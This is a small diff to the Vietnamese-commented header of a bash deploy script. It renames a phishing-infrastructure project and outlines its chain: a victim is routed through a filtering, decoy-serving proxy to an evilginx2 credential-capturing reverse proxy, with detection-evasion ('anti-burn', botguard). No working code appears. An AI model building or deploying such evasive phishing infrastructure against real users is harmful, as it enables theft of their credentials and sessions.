@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# deploy.sh — orchestrator: dựng node fake-evilginx-pro hoàn chỉnh chống-burn trên 1 VPS
+# deploy.sh — orchestrator: dựng node RedPhish hoàn chỉnh chống-burn trên 1 VPS
 #
 # Kiến trúc: victim -> InfraGuard :443 (campaign_token + filters + decoy)
 #              -> evilginx2 127.0.0.1:4443 (wildcard cert, botguard) -> origin
